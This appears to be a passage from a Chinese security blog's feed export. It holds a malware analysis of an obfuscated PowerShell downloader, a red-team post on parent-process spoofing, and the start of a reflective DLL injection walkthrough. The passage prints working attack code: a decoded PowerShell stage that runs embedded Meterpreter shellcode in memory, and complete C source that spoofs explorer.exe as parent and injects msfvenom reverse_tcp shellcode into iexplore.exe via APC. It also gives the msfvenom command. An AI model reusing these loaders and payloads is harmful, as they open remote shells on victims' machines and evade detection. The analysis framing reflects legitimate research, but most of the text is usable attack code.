AHQASQBTAGYAcwBXAE0AZQBJAE8AMgBSADkAWgArAFYAawBsADgAcgBnAFIAUwBZADUAWgBMAEwAYwBqAGoAQwAzAEgAYQBXAFYAZwBTAGQATgBCAHMAdgBnAEMAVQA1ADEANgBDAHAAOAA0AC8ARQBQAGYANQAxAGUAbQByADAAKwBoAFkASwBWAHYAcgBlAGEAWABBADYARwBTADUASAB5AE8AQQBKAG8ANgB6AEEAdQArAGwAMwBnAGwASwBTADcARABCAGkAYwArAHkAdgBJAEoAcABZADUASwBYAFMARgBvADkARQBTAHMAMAA0AHAAMwBmACsAcgA1ADYANQB5AGcATABrAHEAbgBuAFgAVgA3AEEAMgB0AEwATABjAEwAZwBDAG4AVABxAGIAagBSAFEAaAB6AGUAVQBiADMAeQAvAEwAUABvAG8AdwBSAGYAMgBLACsAaQBrAE8AagBwAFUAbgB2AHMAUQB4AGkAZwBqAGEAaAA5AGcAKwBpAHQAMABBAEwATABGAFoAYgA2AEMAdwBqAHcAaQBLAGYAYwBaAFoANAA2AG4AKwBSAHMAMQBJAE0AWAB2AFMAMQBVAHAATQBRAHAAUwByAEEAZQBTAHAAQQBGAFMAUQBRAHUAbAByAE0ASQBkAEUAaQBFADIATAAyAGkAZwBGAGsAZwA1AHoAcQBMADEARwBCAFAAVwBPAGoAdABKADEAagBWAGQASAA3ADMAdwBPAFEAawAyAGQAKwBFAFgAUgBFAHMAWQBsAEgATABpAGcASgBiAGoASQBKAHkAaABzAEMAUwBvAHQAYwBMADIAbABsAGkAegBiAEQANQB0AGYANABOAG8AbABZAFQAagB3AEMAMwBZADAAdAA1AEsAZQBpAEsAdwBkADYAaABrAHQAVwBGADQARwBrAEQAZwBJAGYAdQBKAHUAVQBJAEIAOQB3AHIAbABvAEMAUQBNAGMASQBxADEAeQBjAFgAeAAwADMASAB5AFIAQwBkADAAbgBCAE0ANABCAFcASABxAEEAVABNAEEASwBaADgAQgBsAHYAQgB4AHkAdwBNAGgAVABMADcAVgBkAHgASwB4ADAAUQAxAEEASwBJAHYAdQBUAGIAeABJAC8AaABuAE4AZQBGAC8AdQArAGYAUAB3AFkAaABjADEAdgBFAEIANgByACsAVgBDADYAbgBJAHcAagBDADgALwB3AFEAWQBaAGQAawByAEcAVwA0AE8ARwBjAHcAUQAzAEMAaQBkADAAWAAwAG4ALwB5AC8AKwB6AHUATwBDAEQAUgBjADEAUQBuAFEAegB3AGUAawBhAFYAVwBNAFYANwBhAEQAWgByAHkAbQBxAHgAcAAyAFoATwBRAE0AeQBEAEEAegBMAE4AVQA4AHcAdAAwADIAVAAxAGMARQArAEoAcgAyAGMARAA5AHQAKwBOACsAOQBxAGoAQwBZADUAaQAzAGoAcQBlADUAVQAyADkAaAAyAGUARwBRAHUAQgBaAHoANwB3AHcAOABtAGkAYQBKAGgAVAB0AFcARABQAE4AcQBhAHMAUgBqAHAAbQB6AGUAVAB5AGEARABvAGQAcwBmAHEASABsAC8AbAAwAFMAcQBWAFYAagBHAFEASwB1AGMAagBxAFkARwBBAC8AeQBiAE4AOQBTAG0AVQA5AEQARAArAHMAagA1AHUATABQAFUAVQBFAHYAagBlAFgAeQBuAGIANgAxAHgATQByAGYAQQBrAFQANgBLAHIAUgBpACsAbQBwAFUARQBtAHIASgBRAFkAawAwAHgAOQBaAEcAcgBKAFEAWgBXADEATgBoADEAQgBrADYAMwBzADcARABrAEgAdABIAHcAbwAyAHUANQA2AG0ARAAyADUATwAvAEoAagA5AEgAdABEAHUAYQA3AGkAWABwAGoARAA5AFgARQAvAEIAQwBhAG4AUQB0AHoAcgA3AC8AbQArAG8AdgAxADkAYQBoAHYANwBPAGMAQgBuAHoAdAAzAGgAWQBFAE4AOABHAE8AWQBkADQANgBYAG8ASgBtADMAMABXAGEARwB1AFgAQwA4AGoAUgBXAGYAYgBXAFAASABHADgAbABkAE0AOQBGAGcAMwBjAEsANwAwAGMAYQBWADQAZQBsADAAaABnADgAMABmAEwAUgBKADcAOQBFAEcAdQBJADYAMwBHAEcASwAwAHMARwBKAFUAeABhAHEAagBxAHUANABkAEoAZQA3ADkAVgBsAGMAMQBNADkAaQArAFQAMwBiAHIAcQBUAG0ARgB0AGYAWABFAG8AagB2AG4AZgBtAE8ASAAxAGQAMQBBAC8AdAAyAHoATQBkAHAAawBxAG0ATwBvAHEAawBuAGcAVABLAGEAcQB2ACsAMwBMAG4AVgBuADIAMwB2AEgAZQBPAGwATgBEADIAVgBWAFQAWgBiAGMAMQBQAHMAcABiAEEAdwArADMANgAvAG8ANwB2AGIANgA4AGoATwBXAG8ATwA1AFkAOQAxADYASQBEAFAAOQBFAEEAYgB6AFgAcwByAHYASAB3AEQAUABaAFMAMwAxAFAAdQBJAHQAbgBqAC8ATwBsAHIASwBqAC8AUwBPAGIAawBjADIAbgB0AE8ASQBSADQASABkAEQARABuAHoASQA5AHYAUQBlACsAZwBvAHoASgBxAHoAVwBYAFoAaQArAFYAWQBqAFkAaABuAHgAVAAwAG4AbgBtAGYAMAB3AGwAKwBEADcAVgBtAHMAQQBrAEsASQBFAFgASQBkAEQAUwAwADcAQQBLAHcARQByADYAZABuAGMANwBrAHoAQgBUAHgASwBPAHQAdwBwAEgARwBzADYANwBJAEcAOQBpAC8AVQBMAE4AdAAwAEUAdQBBADAAWAB2AHEAcAB4AEgATgByAHMATwBsAE4AbgA2ACsAdABMAHYAZQBxAE4AYgBZAGoARAA2ADQAQgBOADYAcABXAFQAMgBRAEIAcwBBAHUAWgB5ADMAZQBNADAAUQAzADcANwByAGsANgB2AFgAVwB0ACsARQBkADcAZgBhAHYASgBaAGUATwBmAEgAMgBzAEkATgBJAHIAMAAzAG0AbQBIAHYAUQBmAFoAZQA4AHkATQBBAFoANgBCAFIAUABHADYANwBuAFcAZgBGAC8AYgAzAEcAWgBQAHQANQBrAGYAZwBFAGkAaAA0ADYAegB2AEcAcQBNAGIAUABjAHIATAB2AEkATwBNAE4AYwBRAHgAVABoAHYAMgBPAE4AYwBvAG8ASQA5AEcAMwBvADcATQBmAEQAcQBoAEsAUwBCAGIAeQBEAFEAYgBlAEIAMwBuAG4AbwBhAEwAegBCAFQAbQBIADQANQB1AEwARgBrAFMAUQA4AEMAVQBwAGYAKwB0AHAAeAA2AGUAcABxAEEAUQBqAGgANwBOAE8AMABQAFUASQAwAFoAawBsAEwAMgBiADEAUgBGAEcAaABUAHkAcQA2AHIAUQBJAEEALwBIADUATwBlAGIAUwBwAG8AbQBHAG0ATABOADcAawBEAEoAdwBmAEQAWgBHADkAWQA0AHAAZABCAEkANQByAE4AdwAvACsAVABxAGYAbwBDAFMAdQBBAFQALwBwAGkAcABMADIAcwAvADIAUAAwAHAAOQBwAFIAVwBIAGUAMAAzADYAMQA4AHYALwBCAEsAYgB2AHgAagAzAHoATQBjAE0ANQBGAHkANABRAEEAawA2AHQAUABDAFgAdwBxADkAcgA0AHQAawBQAEQAawA4AEkANQBEAHkAcQBIAC8ANgBIACsAcQBGAGsANQB6AGYAdwAzAC8AUABxADkARgAvAEMAWABSAFQAbwBDAFEAcwBBAEEAQQA9AD0AJwAnACkAKQApACwAWwBTAHkAcwB0AGUAbQAuAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgBNAG8AZABlAF0AOgA6AEQAZQBjAG8AbQBwAHIAZQBzAHMAKQApACkALgBSAGUAYQBkAFQAbwBFAG4AZAAoACkAKQApACcAOwAkAHMALgBVAHMAZQBTAGgAZQBsAGwARQB4AGUAYwB1AHQAZQA9ACQAZgBhAGwAcwBlADsAJABzAC4AUgBlAGQAaQByAGUAYwB0AFMAdABhAG4AZABhAHIAZABPAHUAdABwAHUAdAA9ACQAdAByAHUAZQA7ACQAcwAuAFcAaQBuAGQAbwB3AFMAdAB5AGwAZQA9ACcASABpAGQAZABlAG4AJwA7ACQAcwAuAEMAcgBlAGEAdABlAE4AbwBXAGkAbgBkAG8AdwA9ACQAdAByAHUAZQA7ACQAcAA9AFsAUwB5AHMAdABlAG0ALgBEAGkAYQBnAG4AbwBzAHQAaQBjAHMALgBQAHIAbwBjAGUAcwBzAF0AOgA6AFMAdABhAHIAdAAoACQAcwApADsA</code></pre><p>base64解码一波<br>Base64EncoderDecoder.exe - base64解码（适用于powershell那种base64编码的）<br><img src="https://s1.ax1x.com/2020/11/11/BjgiNR.png" alt=""></p><p>PS-Light-Format.exe - powershell代码美化<br><img src="https://s1.ax1x.com/2020/11/11/BjgTxK.png" alt=""></p><p>美化后的psh</p><pre><code class="powershell">if([IntPtr]::Size -eq 4){$b=$env:windir+&#39;\sysnative\WindowsPowerShell\v1.0\powershell.exe&#39;}else{$b=&#39;powershell.exe&#39;};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments=&#39;-nop -w hidden -c &amp;([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String(&#39;&#39;H4sIAFh/q18CA7VWbW+bSBD+nEj9D6iyZFAcg1M354tU6QBDjGtSE2zs2GedCCyw9bL4YIlNev3vN2vjNFXTqj3pEBL7Mi/PPDO7Q1TSgOGMCqwnfHp1ejL2cz8VxEbsPbaEBjId6eQElhtVfhMK7wRxqW42/Sz1MV1dXellniPKDvP2NWJqUaD0nmBUiJLwjzBLUI7OP9x/RAETPgmNv9rXJLv3SS1W6X6QIOFcpSHfG2WBz6G03Q3BTGz++WdTWp53Vm3j79Inhdh0q4KhtB0S0pSEzxJ3OKk2SGzaOMizIotYe4bpm4v2lBZ+hG7A2gOyEUuysGhKEAW8OWJlToV9PNzAYVtswnCcZ4EahjkqimZLWHLTy9XqD3FZ+70tKcMpaluUoTzbuCh/wAEq2gOfhgTdomgFWi7LMY1XkgRiD9kaiQ1aEtISfsWMeIO2R9Z+Vkl8rgRSY5ZLLcjjC3HaWVgSdNBsvgCU516Cp84/EPf51emr0+hYKVvreaXA6GS5HyOAJo6zAu+l3glKS7DBic+yvIJpY5KXSFo9ESs04p3f+r565ygLkqnnXV7A2tLLcLgCnTqbjRQhzeUb3y/LPoowRf2K+ikOjpUnvsQxigjah9g+it0ALLFZb6CwjwiKfcZZ46n+Rs1IMXvS1UpMQpSrAeSpAFSQQulrMIdEiE2L2igFkg5zqL1GBPWOjtJ1jVdH73wOQk2d+EXREsYlHLigJbjIJyhsCSotcL2llizbD5tf4NolYTjwC3Y0t5KeiKwd6hktWF4GkDgIfuJuUIB9wrloCQMcIq1ycXx03HyRCd0nBM4BWHqATMAKZ8BlvBxywMhTL7VdxKx0Q1AKIvuTbxI/hnNeF/u+fPwYhc1vEB6r+VC6nIwjC8/wQYZdkrGW4OGcwQ3Cid0X0n/y/+zuOCDRc1QnQzwekaVWMV7aDZrymqxp2ZOQMyDAzLNU8wt02T1cE+Jr2cD9t+N+9qjCY5i3jqe5U29h2eGQuBZz7ww8miaJhTtWDPNqasRjpmzeTyaDodsfqHl/l0SqVVjGQKucjqYGA/ybN9SmU9DD+sj5uLPUUEvjeXynb61xMrfAkT6KrRi+mpUEmrJQYk0x9ZGrJQZW1Nh1Bk63s7DkHtHwo2u56mD25O/Jj9HtDua7iXpjD9XE/BCanQtzr7/m+ov19ahv7OcBnzt3hYEN8GOYd46XoJm30WaGuXC8jRWfbWPHG8ldM9Fg3cK70caV4el0hg80fLRJ79EGuI63GGK0sGJUxaqjqu4dJe79Vlc1M9i+T3brqTmFtfXEojvnfmOH1d1A/t2zMdpkqmOoqkngTKaqv+3LnVn23vHeOlND2VVTZbc1PspbAw+36/o7vb68jOWoO5Y916IDP9EAbzXsrvHwDPZS31PuItnj/OlrKj/SObkc2ntOIR4HdDDnzI9vQe+gozJqzWXZi+VYjYhnxT0nnmf0wl+D7VmsAkKIEXIdDS07AKwEr6dnc7kzBTxKOtwpHGs67IG9i/ULNt0EuA0XvqpxHNrsOlNn6+tLveqNbYjD64BN6pWT2QBsAuZy3eM0Q377rk6vXWt+Ed7favJZeOfH2sINIr03mmHvQfZe8yMAZ6BRPG67nWfF/b3GZPt5kfgEih46zvGqMbPcrLvIOMNcQxThv2ONcooI9G3o7MfDqhKSBbyDQbeB3nnoaLzBTmH45uLFkSQ8CUpf+tpx6epqAQjh7NO0PUI0ZklL2b1RFGhTyq6rQIA/H5OebSpomGmLN7kDJwfDZG9Y4pdBI5rNw/+TqfoCSuAT/pipL2s/2P0p9pRWHe03618v/BKbvxj3zMcM5Fy4QAk6tPCXwq9r4tkPDk8I5DyqH/6H+qFk5zfw3/Pq9F/CXRToCQsAAA==&#39;&#39;))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))&#39;;$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle=&#39;Hidden&#39;;$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);</code></pre><p>$s.Arguments解析得到code<br><img src="https://s1.ax1x.com/2020/11/11/BjRqNd.png" alt=""></p><pre><code class="powershell">function t8 {    Param ($gVz, $eFQ)            $yrNd = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split(&#39;\\&#39;)[-1].Equals(&#39;System.dll&#39;) }).GetType(&#39;Microsoft.Win32.UnsafeNativeMethods&#39;)    return $yrNd.GetMethod(&#39;GetProcAddress&#39;, [Type[]]@([System.Runtime.InteropServices.HandleRef], [String])).Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($yrNd.GetMethod(&#39;GetModuleHandle&#39;)).Invoke($null, @($gVz)))), $eFQ))}function wI {    Param (        [Parameter(Position = 0, Mandatory = $True)] [Type[]] $gxa,        [Parameter(Position = 1)] [Type] $mVV62 = [Void]    )    $meeBS = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName(&#39;ReflectedDelegate&#39;)), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule(&#39;InMemoryModule&#39;, $false).DefineType(&#39;MyDelegateType&#39;, &#39;Class, Public, Sealed, AnsiClass, AutoClass&#39;, [System.MulticastDelegate])    $meeBS.DefineConstructor(&#39;RTSpecialName, HideBySig, Public&#39;, [System.Reflection.CallingConventions]::Standard, $gxa).SetImplementationFlags(&#39;Runtime, Managed&#39;)    $meeBS.DefineMethod(&#39;Invoke&#39;, &#39;Public, HideBySig, NewSlot, Virtual&#39;, $mVV62, $gxa).SetImplementationFlags(&#39;Runtime, Managed&#39;)    return $meeBS.CreateType()}[Byte[]]$nm = [System.Convert]::FromBase64String(&quot;/EiD5PDozAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdBmgXgYCwIPhXIAAACLgIgAAABIhcB0Z0gB0FCLSBhEi0AgSQHQ41ZI/8lBizSISAHWTTHJSDHArEHByQ1BAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEgB0EFYQVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpS////11JvndzMl8zMgAAQVZJieZIgeygAQAASYnlSbwCABFcwKhxkUFUSYnkTInxQbpMdyYH/9VMiepoAQEAAFlBuimAawD/1WoKQV5QUE0xyU0xwEj/wEiJwkj/wEiJwUG66g/f4P/VSInHahBBWEyJ4kiJ+UG6maV0Yf/VhcB0Ckn/znXl6JMAAABIg+wQSIniTTHJagRBWEiJ+UG6AtnIX//Vg/gAflVIg8QgXon2akBBWWgAEAAAQVhIifJIMclBulikU+X/1UiJw0mJx00xyUmJ8EiJ2kiJ+UG6AtnIX//Vg/gAfShYQVdZaABAAABBWGoAWkG6Cy8PMP/VV1lBunVuTWH/1Un/zuk8////SAHDSCnGSIX2dbRB/+dYagBZScfC8LWiVv/V&quot;)$szw41 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((t8 kernel32.dll VirtualAlloc), (wI @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $nm.Length,0x3000, 0x40)[System.Runtime.InteropServices.Marshal]::Copy($nm, 0, $szw41, $nm.length)$fWXd = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((t8 kernel32.dll CreateThread), (wI @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$szw41,[IntPtr]::Zero,0,[IntPtr]::Zero)[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((t8 kernel32.dll WaitForSingleObject), (wI @([IntPtr], [Int32]))).Invoke($fWXd,0xffffffff) | Out-Null</code></pre><p>base64拿去Extract-IP-From-Meterpreter-ShellCode.exe查连接的ip和port<br><img src="https://s1.ax1x.com/2020/11/11/BjWl59.png" alt=""></p>]]></content>
      
      
        <tags>
            
            <tag> 恶意分析 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>父进程伪造</title>
      <link href="/posts/d0aae8a6.html"/>
      <url>/posts/d0aae8a6.html</url>
      <content type="html"><![CDATA[<p>伪造父进程的关键点：</p><pre><code>1. 寻找explorer.exe的pid，打开文件管理器的进程获取句柄 （寻找你要伪造进程的PID）2. 初始化指定的属性列表以创建进程和线程3. 设置进程属性</code></pre><p>关键函数主要是:</p><ul><li>OpenProcess</li><li>InitializeProcThreadAttributeList</li><li>CreateProcess</li></ul><p>还有个重要的结构体:STARTUPINFOEXA<br><a href="https://docs.microsoft.com/zh-cn/windows/win32/api/winbase/ns-winbase-startupinfoexa" target="_blank" rel="noopener">https://docs.microsoft.com/zh-cn/windows/win32/api/winbase/ns-winbase-startupinfoexa</a><br>STARTUPINFOEXA结构体，微软文档定义如下：</p><pre><code class="c">typedef struct _STARTUPINFOEXA {  STARTUPINFOA                 StartupInfo;  LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList;} STARTUPINFOEXA, *LPSTARTUPINFOEXA;</code></pre><p><img src="https://s1.ax1x.com/2020/10/23/BAYZFS.png" alt="参数"></p><p>InitializeProcThreadAttributeList用于初始化指定的属性列表以创建进程和线程<br><a href="https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-initializeprocthreadattributelist" target="_blank" rel="noopener">https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-initializeprocthreadattributelist</a></p><pre><code class="c">BOOL InitializeProcThreadAttributeList(  LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList,  DWORD                        dwAttributeCount,  DWORD                        dwFlags,  PSIZE_T                      lpSize);</code></pre><p><img src="https://s1.ax1x.com/2020/10/23/BAYUSJ.png" alt="参数"></p><p>父进程伪造部分代码</p><pre><code class="c">STARTUPINFOEXA sInfoEX;PROCESS_INFORMATION pInfo;SIZE_T sizeT;HANDLE expHandle = OpenProcess(PROCESS_ALL_ACCESS, false, getParentProcessID()); //打开explorer进程获取当前进程所有权限ZeroMemory(&amp;sInfoEX, sizeof(STARTUPINFOEXA)); //用0填充数组InitializeProcThreadAttributeList(NULL, 1, 0, &amp;sizeT); //第一次设置属性的数量sInfoEX.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, sizeT); //设置进程属性InitializeProcThreadAttributeList(sInfoEX.lpAttributeList, 1, 0, &amp;sizeT);UpdateProcThreadAttribute(sInfoEX.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &amp;expHandle, sizeof(HANDLE), NULL, NULL); //更新用于进程和线程创建的属性列表中的指定属性。sInfoEX.StartupInfo.cb = sizeof(STARTUPINFOEXA);CreateProcessA(&quot;C:\\Program Files\\internet explorer\\iexplore.exe&quot;, NULL, NULL, NULL, TRUE, CREATE_SUSPENDED | CREATE_NO_WINDOW | EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, reinterpret_cast&lt;LPSTARTUPINFOA&gt;(&amp;sInfoEX), &amp;pInfo);</code></pre><p>getParentProcessID函数用于寻找要伪造父进程pid</p><pre><code class="c">DWORD getParentProcessID() { //返回explorer.exe的pid    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);    PROCESSENTRY32 process = { 0 };    process.dwSize = sizeof(process);    if (Process32First(snapshot, &amp;process)) {        do {            //If you want to another process as parent change here            if (!wcscmp(process.szExeFile, L&quot;explorer.exe&quot;))                break;        } while (Process32Next(snapshot, &amp;process));    }    CloseHandle(snapshot);    return process.th32ProcessID;}</code></pre><p>(使用APC的方式执行shellcode)<br>完整代码如下</p><pre><code class="c">#include &quot;stdafx.h&quot;#include &lt;windows.h&gt;#include &lt;TlHelp32.h&gt;#include &lt;iostream&gt;DWORD getParentProcessID() { //返回explorer.exe的pid    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);    PROCESSENTRY32 process = { 0 };    process.dwSize = sizeof(process);    if (Process32First(snapshot, &amp;process)) {        do {            //If you want to another process as parent change here            if (!wcscmp(process.szExeFile, L&quot;explorer.exe&quot;))                break;        } while (Process32Next(snapshot, &amp;process));    }    CloseHandle(snapshot);    return process.th32ProcessID;}int main() {    //Shellcode, for example; msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=x.x.x.x EXITFUNC=thread -f c    unsigned char shellCode[] =        &quot;\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51\x41\x50\x52&quot;        &quot;\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48&quot;        &quot;\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9&quot;        &quot;\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41&quot;        &quot;\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48&quot;        &quot;\x01\xd0\x66\x81\x78\x18\x0b\x02\x0f\x85\x72\x00\x00\x00\x8b&quot;        &quot;\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b&quot;        &quot;\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41&quot;        &quot;\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1&quot;        &quot;\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45&quot;        &quot;\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b&quot;        &quot;\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01&quot;        &quot;\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48&quot;        &quot;\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9&quot;        &quot;\x4b\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33\x32\x00\x00&quot;        &quot;\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00\x00\x49\x89\xe5&quot;        &quot;\x49\xbc\x02\x00\x11\x5c\xc0\xa8\x71\x91\x41\x54\x49\x89\xe4&quot;        &quot;\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x4c\x89\xea\x68&quot;        &quot;\x01\x01\x00\x00\x59\x41\xba\x29\x80\x6b\x00\xff\xd5\x6a\x0a&quot;        &quot;\x41\x5e\x50\x50\x4d\x31\xc9\x4d\x31\xc0\x48\xff\xc0\x48\x89&quot;        &quot;\xc2\x48\xff\xc0\x48\x89\xc1\x41\xba\xea\x0f\xdf\xe0\xff\xd5&quot;        &quot;\x48\x89\xc7\x6a\x10\x41\x58\x4c\x89\xe2\x48\x89\xf9\x41\xba&quot;        &quot;\x99\xa5\x74\x61\xff\xd5\x85\xc0\x74\x0a\x49\xff\xce\x75\xe5&quot;        &quot;\xe8\x93\x00\x00\x00\x48\x83\xec\x10\x48\x89\xe2\x4d\x31\xc9&quot;        &quot;\x6a\x04\x41\x58\x48\x89\xf9\x41\xba\x02\xd9\xc8\x5f\xff\xd5&quot;        &quot;\x83\xf8\x00\x7e\x55\x48\x83\xc4\x20\x5e\x89\xf6\x6a\x40\x41&quot;        &quot;\x59\x68\x00\x10\x00\x00\x41\x58\x48\x89\xf2\x48\x31\xc9\x41&quot;        &quot;\xba\x58\xa4\x53\xe5\xff\xd5\x48\x89\xc3\x49\x89\xc7\x4d\x31&quot;        &quot;\xc9\x49\x89\xf0\x48\x89\xda\x48\x89\xf9\x41\xba\x02\xd9\xc8&quot;        &quot;\x5f\xff\xd5\x83\xf8\x00\x7d\x28\x58\x41\x57\x59\x68\x00\x40&quot;        &quot;\x00\x00\x41\x58\x6a\x00\x5a\x41\xba\x0b\x2f\x0f\x30\xff\xd5&quot;        &quot;\x57\x59\x41\xba\x75\x6e\x4d\x61\xff\xd5\x49\xff\xce\xe9\x3c&quot;        &quot;\xff\xff\xff\x48\x01\xc3\x48\x29\xc6\x48\x85\xf6\x75\xb4\x41&quot;        &quot;\xff\xe7\x58\x6a\x00\x59\x49\xc7\xc2\xf0\xb5\xa2\x56\xff\xd5&quot;;    STARTUPINFOEXA sInfoEX;    PROCESS_INFORMATION pInfo;    SIZE_T sizeT;    HANDLE expHandle = OpenProcess(PROCESS_ALL_ACCESS, false, getParentProcessID()); //打开explorer进程获取当前进程所有权限    ZeroMemory(&amp;sInfoEX, sizeof(STARTUPINFOEXA)); //用0填充数组    InitializeProcThreadAttributeList(NULL, 1, 0, &amp;sizeT); //初始化指定的属性列表以创建进程和线程    sInfoEX.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, sizeT); //设置进程属性并从堆中分配内存    InitializeProcThreadAttributeList(sInfoEX.lpAttributeList, 1, 0, &amp;sizeT);    UpdateProcThreadAttribute(sInfoEX.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &amp;expHandle, sizeof(HANDLE), NULL, NULL); //更新用于进程和线程创建的属性列表中的指定属性。    sInfoEX.StartupInfo.cb = sizeof(STARTUPINFOEXA);    CreateProcessA(&quot;C:\\Program Files\\internet explorer\\iexplore.exe&quot;, NULL, NULL, NULL, TRUE, CREATE_SUSPENDED | CREATE_NO_WINDOW | EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, reinterpret_cast&lt;LPSTARTUPINFOA&gt;(&amp;sInfoEX), &amp;pInfo);    LPVOID lpBaseAddress = (LPVOID)VirtualAllocEx(pInfo.hProcess, NULL, 0x1000, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE); //分配内存    SIZE_T *lpNumberOfBytesWritten = 0;    BOOL resWPM = WriteProcessMemory(pInfo.hProcess, lpBaseAddress, (LPVOID)shellCode, sizeof(shellCode), lpNumberOfBytesWritten); //写入内存    QueueUserAPC((PAPCFUNC)lpBaseAddress, pInfo.hThread, NULL); //APC调用    ResumeThread(pInfo.hThread); //启动线程    CloseHandle(pInfo.hThread); //关闭线程    return 0;}</code></pre><p>效果如下<br><img src="https://s1.ax1x.com/2020/10/23/BANyxH.png" alt="父进程是explorer.exe"></p><p><img src="https://s1.ax1x.com/2020/10/23/BANcMd.png" alt="通信"></p><p><img src="https://s1.ax1x.com/2020/10/23/BANqLn.png" alt="meterpreter"></p><p>参考链接:<br><a href="https://xz.aliyun.com/t/8387" target="_blank" rel="noopener">https://xz.aliyun.com/t/8387</a></p>]]></content>
      
      
        <tags>
            
            <tag> 红队 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>反射DLL注入研究</title>
      <link href="/posts/907443e1.html"/>
      <url>/posts/907443e1.html</url>
      <content type="html"><![CDATA[<p>代码来源于:<a href="https://github.com/stephenfewer/ReflectiveDLLInjection" target="_blank" rel="noopener">https://github.com/stephenfewer/ReflectiveDLLInjection</a></p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>主要文件inject.c<br><img src="https://s1.ax1x.com/2020/10/19/0vb9Gq.png" alt=""></p><p>code如下</p><pre><code class="C">#define WIN32_LEAN_AND_MEAN#include &lt;windows.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &quot;LoadLibraryR.h&quot;#pragma comment(lib,&quot;Advapi32.lib&quot;)#define BREAK_WITH_ERROR( e ) { printf( &quot;[-] %s. Error=%d&quot;, e, GetLastError() ); break; }// Simple app to inject a reflective DLL into a process vis its process ID.int main( int argc, char * argv[] ){    HANDLE hFile          = NULL;    HANDLE hModule        = NULL;    HANDLE hProcess       = NULL;    HANDLE hToken         = NULL;    LPVOID lpBuffer       = NULL;    DWORD dwLength        = 0;    DWORD dwBytesRead     = 0;    DWORD dwProcessId     = 0;    TOKEN_PRIVILEGES priv = {0};#ifdef WIN_X64    char * cpDllFile  = &quot;reflective_dll.x64.dll&quot;;#else#ifdef WIN_X86    char * cpDllFile  = &quot;reflective_dll.dll&quot;;#else WIN_ARM    char * cpDllFile  = &quot;reflective_dll.arm.dll&quot;;#endif#endif    do    {        // Usage: inject.exe [pid] [dll_file]        if( argc == 1 )            dwProcessId = GetCurrentProcessId();        else            dwProcessId = atoi( argv[1] );        if( argc &gt;= 3 )            cpDllFile = argv[2];        hFile = CreateFileA( cpDllFile, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL ); //创建dll或读取dll        if( hFile == INVALID_HANDLE_VALUE )            